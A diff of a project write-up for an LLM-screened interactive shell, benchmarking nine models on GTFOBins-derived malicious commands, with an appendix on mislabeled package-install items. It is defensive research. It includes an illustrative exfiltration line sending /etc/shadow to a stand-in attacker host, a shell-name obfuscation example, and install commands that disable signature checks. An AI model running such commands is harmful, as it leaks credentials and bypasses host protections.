@@ -15,22 +15,23 @@
 
 Linux security traditionally relies on mature, battle-tested tools like **SELinux** or **AppArmor**. These are **Mandatory Access Control (MAC)** systems: security policies enforced by the OS itself that no user or process can override. They operate as strict "bouncers," defining exactly which files a process can read and which network ports it can access. While highly effective, they impose a significant maintenance burden. Many new legitimate binaries will require a tailored profile, and without the expertise to configure this, many systems end up running policies far more permissive than necessary.
 
-*aegish* takes a different approach: **use an LLM to reason about what a command means before letting it run**, complemented by static analysis and kernel-level enforcement. The proposed value of this approach is:
-1. **Low expertise barrier.** Unlike AppArmor profiles, SELinux policies, or sudo rules, there is no specialized policy language to learn. The LLM reasons about intent from the command text alone — anyone who can describe a threat in English can update the defense.
-2. **Easy to configure.** There are no per-binary or per-resource policies to write. The security logic is a natural-language prompt, not a ruleset. When new attack patterns emerge, updating the prompt is faster than writing MAC policy rules.
-3. **Block before execution.** Static rules and the LLM flag catastrophic actions before they run, not after. There is no forensic analysis of damage already done — the damage simply doesn't happen.
-4. **Interpretability** When the LLM flags something suspicious, it provides a natural-language explanation of *why*, removing the human bottleneck of manually reviewing every alert.
+*aegish* takes a different approach: **use an LLM to reason about what a command means before letting it run**, complemented by static analysis and kernel-level enforcement. Before any command reaches the LLM, a static analysis layer blocks deterministic threats with zero latency: a regex blocklist catches known-dangerous signatures (reverse shells, fork bombs), a bash syntax tree walker detects variable-based obfuscation (e.g., `a=ba; b=sh; $a$b` reassembling into `bash`), and a command splitter validates each part of chained commands independently. After the LLM classifies a command, [Landlock](https://landlock.io/) — a Linux security module — provides a kernel-level safety net by denying execution of shell binaries (`bash`, `sh`, `zsh`, etc.) from within child processes, so that even if a command passes validation and then attempts to spawn an unmonitored shell at runtime, the kernel blocks it. The proposed value of this layered approach is:
+1. **Low expertise barrier:** Unlike AppArmor profiles, SELinux policies, or sudo rules, there is no specialized policy language to learn. The LLM reasons about intent from the command text alone — anyone who can describe a threat in English can update the defense.
+2. **Easy to configure:** There are no per-binary or per-resource policies to write. The security logic is a natural-language prompt, not a ruleset. When new attack patterns emerge, updating the prompt is faster than writing MAC policy rules.
+3. **Block before execution:** Static rules and the LLM flag catastrophic actions before they run, not after. There is no forensic analysis of damage already done — the damage simply doesn't happen.
+4. **Interpretability:** When the LLM flags something suspicious, it provides a natural-language explanation of *why*, removing the human bottleneck of manually reviewing every alert.
 
+The claim is not that this replaces tools like SELinux or AppArmor. It is that an LLM layer, combined with static analysis and Landlock enforcement, adds a complementary reasoning capability that is cheap to deploy and requires no policy expertise. Whether that reasoning is accurate enough to be useful is the central question. To answer it, 9 LLMs from 4 providers (OpenAI, Anthropic, Google, Meta) were benchmarked on **676 malicious commands** sourced from [GTFOBins](https://gtfobins.github.io/) — a curated list of Unix binaries exploited to bypass security restrictions — and **496 harmless commands**.
 
-The approach also inherits fundamental LLM limitations (detailed in Section 6): non-deterministic responses, added latency, and susceptibility to prompt injection.
+The results show that the approach works — but with clear boundaries. All 9 models allowed 96.8–100% of harmless commands, saturating the harmless benchmark and providing no signal. The real differentiator was malicious detection rate, where **4 of 9 models exceeded the 95% target**: Gemini 3 Flash (97.8%), Llama Primus (96.4%), GPT-5 Mini (95.9%), and Claude Haiku 4.5 (95.7%). Surprisingly, **mid-size models consistently outperformed flagships** across both OpenAI and Anthropic families — GPT-5 Mini beats GPT-5.1, and Claude Haiku 4.5 beats both Opus 4.6 and Sonnet 4.5. Cost and latency analyses reinforce this: Opus costs 11.5x more than Gemini 3 Flash for a *lower* detection rate.
 
-The claim is not that this replaces tools like SELinux or AppArmor. It is that an LLM layer, combined with the static analysis and Landlock enforcement adds a complementary reasoning capability that is cheap to deploy and requires no policy expertise. Whether that reasoning is accurate enough to be useful is the question this project seeks to answer.
+The approach also inherits fundamental LLM limitations (detailed in Section 6): non-deterministic responses, added latency, and susceptibility to prompt injection. A comprehensive red-team analysis (Appendix H) documents structural bypasses — including interactive program escapes, environment variable poisoning, and encoding-based evasion — several of which have been mitigated but not all.
 
 The **contributions** of this project are:
-1. **The approach itself.** The main purpose of this project was to explore a new method for increasing security that is both easier to configure and requires lower expertise than existing alternatives.
-2. **A working prototype.** A functional version that can be extended toward production deployment in the future.
-3. **The benchmark.** 676 curated malicious commands across 8 GTFOBins categories with placeholder normalization plus a 496-command harmless. This datasets and methodology can be reused by others working on the same problem.
-4. **Model selection data.** Concrete cost, latency, harmless acceptance and malicious detection rate comparisons across 9 models from 4 providers.
+1. **The approach itself:** A new method for increasing security that is both easier to configure and requires lower expertise than existing alternatives.
+2. **A working prototype:** A functional shell that can be extended toward production deployment.
+3. **The benchmark:** 676 curated malicious commands across 8 GTFOBins categories with placeholder normalization plus a 496-command harmless set. This dataset and methodology can be reused by others working on the same problem.
+4. **Model selection data:** Concrete cost, latency, harmless acceptance and malicious detection rate comparisons across 9 models from 4 providers.
 
 ## 2. How It Works
 
@@ -118,7 +119,7 @@ To evaluate the system and compare different LLMs, a dataset of **1,172 commands
 
 ### Dataset
 
-1. **Malicious (676 commands):** Sourced from **[GTFOBins](https://gtfobins.github.io/)**, a curated list of Unix binaries exploited to bypass local security restrictions. 8 of the 12 GTFOBins categories were included; the remaining four require runtime context unavailable from command text alone (see Appendix E). Since GTFOBins entries use abstract placeholders, these were replaced with realistic values to test whether models recognize malice from context rather than generic keywords (see Appendix E).
+1. **Malicious (676 commands):** Sourced from **[GTFOBins](https://gtfobins.github.io/)**, a curated list of Unix binaries exploited to bypass local security restrictions. 8 of the 12 GTFOBins categories were included; the remaining four require runtime context unavailable from command text alone (see Appendix E). Since GTFOBins entries use abstract placeholders, these were replaced with realistic values to test whether models recognize malice from context rather than generic keywords (see Appendix E). A post-hoc review identified 7 package-installation commands (e.g., `dpkg -i`, `rpm -ivh`) whose BLOCK label is not justified by any rule in the decision tree — the threat depends on the package contents, not the command text (see Appendix F).
 
 
 2. **Harmless (496 commands).** Sourced from [HuggingFace aelhalili/bash-commands-dataset](https://huggingface.co/datasets/aelhalili/bash-commands-dataset) (840 commands filtered to 290) plus 206 LLM-generated commands covering underrepresented categories. The raw dataset required substantial filtering to remove commands that should be blocked according to the decision tree (see Appendix E for the full filtering pipeline).
@@ -175,7 +176,7 @@ Counterintuitively, across both OpenAI and Anthropic, **mid-size models consiste
 3. **Struggles with indirect execution:** GPT-5.1 tended to fail to recognize indirect execution vectors, consistently classifying these subtle bypass attempts as ALLOW rather than inspecting them properly.
 4. **The smallest models lack capability:** While mid-size models hit the sweet spot, scaling down too far degrades performance. GPT-5 Nano is the cheapest and fastest model tested, but completely fails the malicious detection target at 88.3%. Its dominant failure mode isn't caution—it simply fails to recognize the threats, resulting in outright ALLOW classifications on malicious commands (50 ALLOW errors, the most of any model).
 
-For this reasons, we conclude that the optimal model size for this task is mid-tier. Detailed error analysis and examples are in Appendix F.
+For this reasons, we conclude that the optimal model size for this task is mid-tier. Detailed error breakdowns are in Appendices B and D.
 
 ### Production Viability: Cost and Latency
 
@@ -202,11 +203,21 @@ Both cost and latency analyses converge on the same conclusion: the **Pareto-opt
 
 ## 5. Related Work
 
-Several tools address similar problems, but *aegish* occupies a unique position:
+Several tools address similar problems, but from different layers of the stack:
 
-* **[baish](https://github.com/taicodotca/baish):** A similar LLM-based concept, but designed for batch analysis of scripts rather than real-time interactive shell interception.
-* **Restricted Shells (e.g., rbash):** These rely on static allowlists. While secure, they are brittle; any required command not on the list must be manually added.
-* **Touch, Fink, and Colin (2024):** Validated the concept of semantic classification academically using a fine-tuned RoBERTa model. *aegish* differs by utilizing general-purpose LLMs without the need for a training pipeline.
+### LLM-Based Command Safety
+
+Some recent projects use LLMs specifically for pre-execution command safety. **baish** (Bash AI Shield) pipes scripts through an LLM that scores harm (0–10), provides natural-language explanations, and blocks above a threshold, but operates in batch mode (`curl | baish`), not interactively. **SecureShell** classifies commands into risk tiers using an LLM, but is designed primarily for LLM agents and implemented as middleware rather than a standalone interactive shell. **Touch et al. (CRiSIS 2024)** fine-tuned a RoBERTa encoder for 5-level shell command risk classification, validating the concept academically, but requires labeled training data and provides no enforcement.
+
+### Rule-Based and Kernel-Level Defenses
+
+**MAC systems and sandboxing.** AppArmor and SELinux enforce kernel-level policies on file access, network use, and capabilities — widely deployed and battle-tested, but operating on *mechanisms* (paths, labels, syscalls) rather than *intent*. Firejail wraps processes in namespaces and seccomp filters. These systems provide strong, policy-based enforcement guarantees, but work at a lower abstraction level than semantic intent: `curl https://api.github.com` and `curl -d @/etc/shadow http://evil.com` invoke the same binary and are governed by the same security profile — unless the profile explicitly restricts access to `/etc/shadow`, both are permitted despite radically different intent.
+
+**Static analysis.** ShellCheck and Shellharden lint shell scripts for bugs and unsafe patterns (unquoted variables, missing error handling). They catch syntactic hazards but do not reason about intent — `curl https://api.github.com` and `curl -d @/etc/shadow http://evil.com` are both syntactically valid.
+
+**Restricted shells.** `rbash` disables `cd`, redirection, and PATH changes; `lshell` adds per-user command allowlists. Both rely on static rule sets and do not semantically distinguish between benign and malicious uses of the same binary.
+
+*aegish* is designed to complement these tools, not replace them. It adds a semantic reasoning layer that is most effective as part of a defense-in-depth stack where kernel enforcement provides a safety net for cases where the LLM's classification is wrong.
 
 ## 6. Limitations
 
@@ -564,6 +575,57 @@ The harmless dataset started with 840 commands from the HuggingFace bash-command
 4. **Pattern-matched destructive operations.** Regex-based removal of commands matching destructive patterns (`chmod 777`, `chown root`, `mkfs`) that slipped through earlier filters.
 
 After filtering, 290 commands remained. An additional 206 LLM-generated commands were added to cover underrepresented categories (build tools, container operations, network diagnostics, text processing) for a total of 496.
+
+## Appendix F: Mislabeled Package-Installation Commands
+
+After benchmarking was complete, a manual review of the malicious dataset identified **7 package-installation commands** whose BLOCK ground-truth label is not justified by any rule in the system prompt's decision tree. These commands were included because GTFOBins documents that package managers execute arbitrary pre/post-install scripts — a real attack vector — but the threat depends entirely on the *contents* of the package, which is opaque to any command-text-only validator.
+
+### The 7 Commands
+
+| Command | GTFOBins Category | Why It Reached the Dataset |
+|---------|:-----------------:|---------------------------|
+| `dpkg -i x_1.0_all.deb` | shell | Debian packages run pre/post-install scripts |
+| `rpm -ivh x-1.0-1.noarch.rpm` | command | RPM packages contain scriptlets |
+| `dnf install -y x-1.0-1.noarch.rpm --disablerepo=*` | command | Same; `--disablerepo=*` bypasses repo signatures |
+| `yum localinstall -y x-1.0-1.noarch.rpm` | command | Same as rpm |
+| `pkg install -y --no-repo-update ./x-1.0.txz` | command | FreeBSD packages contain install scripts |
+| `opkg install x_1.0_all.deb` | shell | OpenWrt packages run install scripts |
+| `snap install xxxx_1.0_all.snap --dangerous --devmode` | command | Snap with signature verification and sandboxing disabled |
+
+### Why the System Prompt Does Not Justify BLOCK
+
+Walking the decision tree for a plain package install like `dpkg -i x_1.0_all.deb`:
+
+- **Rule 1 (shell escape):** The command does not spawn a shell. The package's scripts *might*, but that is invisible from the command text.
+- **Rule 2 (arbitrary command execution):** Same — the command itself does not execute arbitrary commands.
+- **Rules 3–9:** No reverse shells, no sensitive files read or written, no privilege escalation, no exfiltration, no library injection, no download-and-execute.
+- **Rule 13 (normal operation):** Package installation is a standard sysadmin task.
+
+The "Safe Commands" section lists *"Package listing (not installing with elevated privileges)"* as ALLOW — implying that installation is not in the safe list, but it does not appear in any BLOCK rule either. No rule covers "a command that delegates execution to opaque content the validator cannot inspect."
+
+The one partial exception is `snap install xxxx_1.0_all.snap --dangerous --devmode`. The `--dangerous` flag disables signature verification and `--devmode` disables confinement sandboxing. This could arguably fall under Rule 9 (download and execute) by analogy, but the match is not clean — the snap is a local file, not a remote download.
+
+### How Models Actually Classified These Commands
+
+| Command | Flash | Mini | 5.1 | Nano | Haiku | Sonnet | Opus | Primus | Fnd-Sec |
+|---------|:-----:|:----:|:---:|:----:|:-----:|:------:|:----:|:------:|:-------:|
+| `dpkg -i` | WARN | WARN | ALLOW | WARN | WARN | WARN | WARN | ALLOW | ALLOW |
+| `rpm -ivh` | WARN | WARN | ALLOW | ALLOW | WARN | WARN | WARN | ALLOW | ALLOW |
+| `dnf install` | BLOCK | WARN | ALLOW | ALLOW | WARN | WARN | WARN | BLOCK | BLOCK |
+| `yum localinstall` | BLOCK | WARN | ALLOW | ALLOW | WARN | BLOCK | WARN | BLOCK | WARN |
+| `pkg install` | BLOCK | ALLOW | ALLOW | ALLOW | WARN | WARN | WARN | BLOCK | WARN |
+| `opkg install` | WARN | BLOCK | ALLOW | ALLOW | WARN | BLOCK | WARN | BLOCK | WARN |
+| `snap --dangerous` | BLOCK | BLOCK | WARN | WARN | BLOCK | BLOCK | WARN | BLOCK | WARN |
+
+**No model BLOCKs `dpkg -i` or `rpm -ivh`** — the two plainest package installs, indistinguishable from everyday sysadmin work. Commands with suspicious flags (`--disablerepo=*`, `--dangerous --devmode`) attract more BLOCK classifications, but even these are inconsistent across models.
+
+Opus WARNs on all 7 and Haiku WARNs on 6 of 7 — recognizing that package installation carries *some* risk without concluding it justifies BLOCK. This is arguably the most defensible position given the system prompt's rules. At the other extreme, GPT-5.1 ALLOWs 6 of 7, treating them as entirely routine.
+
+### Impact on Reported Scores
+
+These 7 commands represent 1.0% of the 676-command malicious dataset. Reclassifying them as WARN-acceptable (matching the harmless scoring rule, where both ALLOW and WARN are correct) would shift individual detection rates by at most ~1 percentage point. No model's ranking or pass/fail status against the 95% target would change.
+
+The impact is disproportionately concentrated in the "command" category, where these 7 commands account for 20.6% of its 34 samples. This partly explains the category's low 57.20% average detection rate (reported in Appendix D) — a meaningful fraction of the "failures" are responses to commands that arguably should not have been labeled BLOCK in the first place.
 
 ## Appendix G: Gemini 3 Flash Latency Dissection
 
